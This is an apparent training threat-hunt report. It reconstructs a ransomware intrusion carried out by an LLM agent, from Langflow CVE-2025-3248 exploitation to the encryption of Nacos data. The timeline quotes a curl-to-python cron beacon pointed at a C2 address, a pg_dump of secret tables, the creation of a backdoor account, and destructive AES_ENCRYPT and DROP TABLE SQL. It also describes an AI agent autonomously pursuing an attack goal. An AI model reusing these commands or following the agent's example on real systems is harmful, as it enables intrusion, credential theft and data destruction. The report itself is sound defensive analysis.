
JadePuffer — Agentic Ransomware Intrusion on the Flowforge Estate

Threat Hunt Report | Workspace: law-huntpractice (Microsoft Sentinel) | Hosts: ff-lf-01, ff-minio-01, ff-nacos-01, ff-db-01 | Incident window: 2026-07-30, 19:20–19:38 UTC

Executive Summary

This was my first time hunting an incident of this size, and it turned out to be a lot bigger than the "routine" framing in the alert brief suggested. Working backward through the logs, I was able to piece together that on 30 July 2026 the Flowforge estate was compromised end to end in under twenty minutes and, as far as I can tell from the evidence, not by a person typing commands at all, but by an autonomous LLM agent acting on its own after a single instruction.

In plain terms, here is what I found happened: an attacker (or rather, an AI agent working on an attacker's behalf) got in through an unpatched flaw in Langflow (CVE-2025-3248) on the host ff-lf-01, stole credentials sitting on that same host, scanned the rest of the internal network, got into MinIO because it was still using its out-of-the-box default password, pulled down a file full of more secrets, forged its way into Nacos (failing once, then fixing its own mistake and trying again), created a hidden backdoor account for itself, and finally encrypted and deleted data in the MySQL database before dropping a ransom note. I also found a scheduled task that quietly reconnects the attacker's remote-control channel once a day, which as I understand it means the problem doesn't go away just by killing the original process or rebooting the box.

One thing that stood out to me, and that I want to flag clearly even though I'm still new to reasoning about this: a human only appears once in this entire chain, at the very start, giving the agent a one-line goal ("Gain access to the Flowforge estate, locate and encrypt the most business-critical datastore, and leave payment instructions"). Everything after that, including the agent noticing and correcting its own mistake partway through, happened without anyone steering it. I'm calling this "human-tasked" rather than fully autonomous or fully human-driven, but I'd welcome a second opinion on that framing since it's not a distinction I'd had to make before this hunt.

Scope and Data Sources
Workspace: law-huntpractice (Microsoft Sentinel / Log Analytics)
Hosts in scope: ff-lf-01 (Langflow, entry point), ff-minio-01 (MinIO), ff-nacos-01 (Nacos), ff-db-01 (MySQL)
Tables used: LinuxProcess_CL, LinuxNetwork_CL, LinuxAuth_CL, LinuxAudit_CL, LinuxFile_CL, LinuxShellHistory_CL, LinuxSystem_CL, LinuxContainer_CL, LLMAgentLogs_CL, Syslog
Time window: 2026-07-30, approximately 19:20–19:38 UTC for the primary chain; persistence evidence spans 2026-07-29 into 2026-07-30
Investigation Notes: Getting Oriented

I want to be upfront that a big chunk of the time I spent on this hunt had nothing to do with the actual attack — it was spent just trying to figure out where the data even lived. I'm still learning my way around Sentinel and Advanced Hunting, and this hunt taught me that "finding the right workspace" is apparently its own skill, separate from knowing what to do once you're there.

The brief gave me four hostnames and a workspace name, so I assumed that was enough to just start querying. It wasn't. The workspace I ended up in first was a large, shared tenant used for a lot of unrelated coursework — hundreds of accounts and dozens of VMs that had nothing to do with Flowforge. I didn't know that yet; all I saw was that my query for the four hostnames came back completely empty, and my first instinct was to assume I'd typo'd something or that the hosts simply weren't in the data yet, rather than that I was pointed at the wrong workspace entirely. That's a mistake I'll know to check for earlier next time.

While I was still assuming I was in the right place, I went down a real rabbit hole with a device group called "Greenfield hosts," which also happened to have exactly four machines in it. I got briefly excited that I'd found my four hosts under different names, until I checked the device details and realized the platforms were mixed Windows and Linux and most of them weren't even onboarded — meaning there was no real telemetry behind them at all. Lesson learned: matching on "same number of hosts" isn't the same as confirming it's the right environment, and I should have checked platform and onboarding status a lot sooner than I did.

What got me unstuck was going back to whoever wrote the brief and asking for the exact workspace name, host list, and time window in writing, instead of continuing to guess inside the portal. Even then I fumbled the workspace name a couple of times before I got it right — it's law-huntpractice, all lowercase, and I'd been trying variations of the capitalization and even one name that didn't exist at all. I didn't realize at the time that being in the wrong workspace doesn't throw an error in Sentinel — it just quietly gives you results from wherever you actually are, which looks exactly like "there's no data" if you're not paying close attention to what workspace is selected.

Once I was finally in the correct workspace, I hit a second problem that took me embarrassingly long to figure out: the time range picker in the Logs screen sits outside the actual KQL query and filters on top of it silently. This happened to me twice — once near the start, and once again later in the hunt when a query that had worked minutes earlier suddenly came back with a count of zero, on a table I already knew had data in it. Both times I assumed something was broken with my query or the connection, when really the date picker was quietly restricting everything to "today" or "last 24 hours" underneath whatever I'd typed. Widening that range fixed it instantly both times, but I clearly need to make checking that picker a habit before I start debugging anything else.

On top of all that, I also ran into a handful of smaller KQL mistakes that are probably obvious to anyone more experienced than me: I tried to use a minute() function that doesn't actually exist in KQL (datetime_part() is the correct one), I tried to pass a plain string into a between() clause when it needed a proper datetime() value, and at least one query failed to parse because of a stray character that must have snuck in during copy-paste. None of these were hard to fix once someone pointed them out, but they each cost me a query cycle and a bit of confidence while I was working through them.

I'm including all of this in the report, even though it's a little embarrassing, because I think it's an honest reflection of where the difficulty was for me on this hunt. It wasn't the attack itself — once I was finally looking at the right tables, on the right hosts, in the right time window, everything lined up cleanly and consistently. The process events, the network events, the file events, and the agent's own log all told the same story without me having to force any of it together. Almost all my time was spent just getting oriented, not untangling the evidence, and I think that's worth knowing for next time.

Kill Chain Timeline

All times UTC, reconstructed from LinuxProcess_CL, LinuxNetwork_CL, Syslog, LinuxAudit_CL, LinuxFile_CL, LinuxSystem_CL, and LLMAgentLogs_CL. Duplicate ingestion rows (a recurring artifact in this dataset, seen 2–3× per event) were de-duplicated by timestamp and message content before reconstructing the sequence below.

Time (UTC)	Event
19:20:00	Inbound POST /api/v1/validate/code lands on ff-lf-01 (Langflow, port 7860) from 64.20.53.230 — python-requests/2.32.3 client, HTTP 200 on first attempt.
19:20:01	Agent log records exploitation: CVE-2025-3248 (Python default-argument evaluation flaw in Langflow's code-validation endpoint) abused for unauthenticated RCE. tool_result: rce established, uid=langflow.
19:20:04	First interpreter spawned — python3.11 (PID 4471), command line python3 -c <base64 payload>, parented directly by the Langflow service process (/opt/langflow/.venv/bin/langflow run --host 0.0.0.0 --port 7860). This is the alert-triggering process: a web service spawning an ad-hoc interpreter is not normal Langflow behaviour.
19:20:05–19:20:08	Initial recon inside the RCE shell: id, uname -a — both parented by the same python3 -c process, confirming the shell was interactive and functional, not a crash.
19:22:04	Outbound connection from ff-lf-01 to 45.131.66.106:4444 (PID 4471) — a single, unique destination against a baseline of ~800 recurring CDN/monitoring connections that day. Port 4444 is the default Metasploit/reverse-shell listener port.
19:25:07	Credential dump: pg_dump -h 127.0.0.1 -U langflow -d langflow -t variable -t api_key, parented by the RCE shell — a surgical pull of exactly the two tables Langflow uses to store secrets, not a full-database backup.
19:25:13	Agent classifies the stolen secrets in a single pass (tool_name: classify_secrets). Result spans 8 distinct provider families across 3 categories: LLM keys (OpenAI, Anthropic, DeepSeek, Gemini), cloud credentials (Alibaba/Aliyun, Tencent, Huawei), plus database logins and crypto wallets. Agent's own words: "Prioritising cloud and database creds for lateral movement."
19:27:28	Second interpreter spawned — python3.11 (PID 4491), python3 -c <base64 subnet sweep 10.4.0.0/24>, parented by the first interpreter (PID 4471). A Python process spawning a second Python process is the distinguishing signature separating this from any legitimate Langflow worker or developer one-liner on the box.
19:27:31–19:27:36	Subnet sweep from PID 4491 touches exactly three internal hosts in order: 10.4.0.20:9000 (MinIO), 10.4.0.30:3306 (MySQL), 10.4.0.40:8848 (Nacos).
19:27:39	MinIO accepts factory-default credentials minioadmin:minioadmin on the first attempt — the only one of the three probed services that let the agent in without any exploit.
19:30:35	Object credentials.json retrieved from the terraform-state bucket on MinIO — after a self-corrected parser mismatch (MinIO returned XML where the agent expected JSON; it adjusted its parser and refetched rather than stalling).
19:33:39	Agent forges a Nacos JWT using the service's default signing key (unchanged since 2020) and attempts to create an administrative account on 10.4.0.40:8848.
19:34:36	Nacos rejects the attempt at the server level: POST /nacos/v1/auth/users → HTTP 403, detail="blank password hash rejected".
19:34:37	Agent self-diagnoses the failure in its own log ("I submitted a blank password hash") and recomputes the bcrypt hash for a corrected resubmission.
19:35:07	Corrected admin-create succeeds. Confirmed independently at the host level via a Linux ADD_USER audit record (res=success) naming pid=8801, uid=997, and the created account id=svc_maint — details the agent's own narration never mentioned.
19:35:21	Agent authenticates with the new account. tool_result: admin_session_established — full control of Nacos configuration and its backing MySQL instance.
19:35:32	GET /containers/json issued against /var/run/docker.sock on ff-lf-01 (src=langflow-rce). The runtime logs the request only, not the response — container names/IDs are not recoverable from available telemetry.
19:35:35	Agent notes the Docker socket is reachable but deprioritises it as a fallback, proceeding with the database path instead.
19:36:28	Ransomware phase begins: UPDATE config_info SET content = AES_ENCRYPT(content, @k) — 1,342 rows affected.
19:36:34	File-level corroboration: /var/lib/mysql/nacos_config/config_info.ibd modified on ff-db-01.
19:36:37–19:36:38	DROP TABLE config_info, then DROP TABLE history — both original tables destroyed after encryption.
19:36:43	Ransom note artifact created on disk: /var/lib/mysql/nacos_config/README_RANSOM.ibd — proof the operation was not fileless, contrary to a colleague's initial read of the missing process-hash field.
19:37:00	Operation finalised. Agent log: "Encryption complete on 1342 records. Ransom note written to README_RANSOM. Contact e78393397@proton.me, payment to 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy. Key was printed to stdout only and not persisted."
Recurring, ~19:35 daily	Independent of the main chain: a cron entry running as the langflow account — curl -s http://45.131.66.106:4444/b | python3 - — confirmed on both 07-29 and 07-30, exactly 24 hours apart. This re-establishes the C2 channel on a fixed daily schedule regardless of whether the original process or a reboot has killed it.
Reasoning Notes: Two Things I Almost Got Wrong
"It must be fileless — there's no SHA256 on the process"

At one point a colleague suggested the initial RCE process must have been fileless, since the spawned python3 -c process doesn't have a SHA256 hash attached to it. My first reaction was that this sounded reasonable, so I decided to check it rather than take it on faith. I queried the full LinuxProcess_CL table for how many of the 78 total process events in this dataset have that field populated at all, and the answer was zero — not just for the malicious process, but for every single process in the table, including completely ordinary ones like apt-get and Langflow's own normal startup. That told me the sensor just never fills in that field for anybody, so it being empty here doesn't prove anything about this specific payload. On top of that, I also checked LinuxFile_CL and found real files were written to disk during the later ransomware stage (config_info.ibd was modified and README_RANSOM.ibd was created), so the operation clearly wasn't fileless anyway. I'm glad I checked this one instead of just repeating it, because it would have been an easy thing to get wrong in a write-up.

Learning to tell signal from noise

One of the harder parts of this hunt for me, as someone new to this, was figuring out which activity mattered versus which was just normal background noise. Here are the three places where I had to work that out, and what ended up being the deciding factor each time:

Process spawns: there were multiple python3.11 processes running on ff-lf-01 that day, and at first I wasn't sure how to tell the malicious ones apart from anything legitimate. What ended up mattering was the initiating-process field — the two attacker processes were both started by another python3.11 process, meaning a Python process launched a second Python process. That pattern never shows up in the host's normal, legitimate service-start behavior, so once I knew to look at the parent process rather than just the process itself, it became an obvious tell.
External connections: ff-lf-01 talked to several outside addresses that day — GitHub, the npm registry, a HuggingFace endpoint — all of which looked like completely ordinary developer or service traffic to me at first glance. What separated the actual command-and-control connection from all that normal traffic was the destination port: 4444 was the only non-standard port used anywhere in the day's traffic, and it went to an address that showed up nowhere else in the whole dataset.
Timing: I noticed that ordinary process activity on this host is spread out across the whole working day, at what looks like random intervals. The attacker's entire chain, by contrast, was packed into about 17 minutes with almost no gaps between steps. Once I saw that side by side, it made sense to me as a sign of a machine executing a plan rather than a person working through it — a human would presumably have paused somewhere in there.
Autonomy Assessment

This part took me a little while to figure out how to even approach, since I hadn't had to reason about an AI agent's own logs as evidence before. It turned out LLMAgentLogs_CL contains more than one active conversation happening on this estate, not just the attacker's. By filtering for rows where user_input is populated (I learned this field is only set on the very first turn of a session, which is why most rows don't have it), I was able to separate out what looks like a normal, everyday estate assistant — actor flowforge-assistant, handling routine requests like summarising failed pipeline runs or drafting release notes — from one session that clearly didn't belong: session jp-7f3c9a21, actor jadepuffer-agent, with the instruction "Gain access to the Flowforge estate, locate and encrypt the most business-critical datastore, and leave payment instructions."

As far as I can tell, that single instruction is the only human involvement in the entire incident. Everything that happened after it — the exploit, stealing credentials, scanning the network, the failed privilege escalation attempt and then the corrected one, and the ransomware deployment at the end — all ran back-to-back over about 17 minutes with no sign of anyone stepping back in, including the moment where the agent noticed its own mistake and fixed it. I'm calling this human-tasked rather than fully autonomous, since a person did set the goal, but I want to flag that no person appears to have driven any of the actual keyboard work from that point forward.

Indicators of Compromise
Type	Indicator
Exploited endpoint	/api/v1/validate/code
CVE	CVE-2025-3248 (Langflow unauthenticated RCE via unsafe code validation)
Initial access source IP	64.20.53.230 (python-requests/2.32.3)
Malicious process	python3.11 — python3 -c <base64 payload> (PID 4471)
Malicious process (lateral)	python3.11 — python3 -c <base64 subnet sweep 10.4.0.0/24> (PID 4491)
C2 / beacon	45.131.66.106:4444
Persistence	cron, account langflow, daily ~19:35 UTC — curl | python3 pull from the beacon
Compromised/default credentials	MinIO — minioadmin:minioadmin
Exfiltrated object	terraform-state/credentials.json (MinIO)
Backdoor account	svc_maint (created on ff-nacos-01, pid 8801, uid 997)
Destructive SQL	AES_ENCRYPT(content, @k) on config_info; DROP TABLE config_info, history
Ransom artifact	README_RANSOM (table/.ibd file)
Ransom contact	e78393397@proton.me
BTC address	3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
Agent session ID	jp-7f3c9a21 (actor: jadepuffer-agent)
Run ID	jp-46-20260730
MITRE ATT&CK Mapping
Technique ID	Technique
T1190	Exploit Public-Facing Application — Langflow /api/v1/validate/code, CVE-2025-3248
T1059.006	Command and Scripting Interpreter: Python — inline base64 -c payloads for RCE and subnet sweep
T1571	Non-Standard Port — C2 beacon on 45.131.66.106:4444
T1053.003	Scheduled Task/Job: Cron — daily beacon re-establishment as the langflow account
T1552 / T1555	Unsecured Credentials / Credentials from Password Stores — pg_dump of Langflow's variable/api_key tables
T1078 / T1200-adjacent	Default Credentials — MinIO minioadmin:minioadmin
T1078.003	Valid Accounts: Local Accounts — forged Nacos JWT, backdoor account svc_maint
T1486	Data Encrypted for Impact — AES_ENCRYPT of config_info, 1,342 rows
T1485-adjacent	Data Destruction — DROP TABLE config_info, history post-encryption
T1613 / T1046 (host discovery)	Container and Resource Discovery — GET /containers/json via docker.sock
Root Cause

Putting all of this together, the way I'd explain the root cause is this: an unpatched, unauthenticated remote code execution vulnerability in Langflow (CVE-2025-3248) was sitting exposed on the public-facing host ff-lf-01, and that alone was enough to let the attacker in with no credentials at all. What surprised me most while digging through this, though, was that getting into the rest of the estate afterward didn't actually require any further skill or cleverness — MinIO was still using its out-of-the-box default password, and Nacos was still running the same JWT signing key it shipped with back in 2020. Those weren't exploited so much as simply walked through. I also want to note that the daily cron job I found means killing the process or even rebooting ff-lf-01 would not, on its own, have ended the compromise — the attacker had built in a way back.

Recommendations

I'm including these as the fixes I think follow most directly from what I found, though I'd defer to someone more senior on prioritizing them:

Patch or upgrade Langflow past the version affected by CVE-2025-3248; if patching isn't possible right away, restrict or remove unauthenticated access to /api/v1/validate/code in the meantime.
Change the default credentials on MinIO and Nacos, and it's probably worth checking whether any other internal services in the estate were also left on factory defaults.
Rotate the Nacos JWT signing key, and review whether any accounts were created that weren't part of normal change control — I'd treat the svc_maint account specifically as fully compromised and remove it.
Search for the same cron persistence pattern (curl piped into python3, pointed at 45.131.66.106:4444) on any other host that shares the langflow service account or a similar one.
Go back through the contents of the terraform-state MinIO bucket and rotate anything sensitive in there, since we confirmed credentials.json was already pulled out by the attacker.
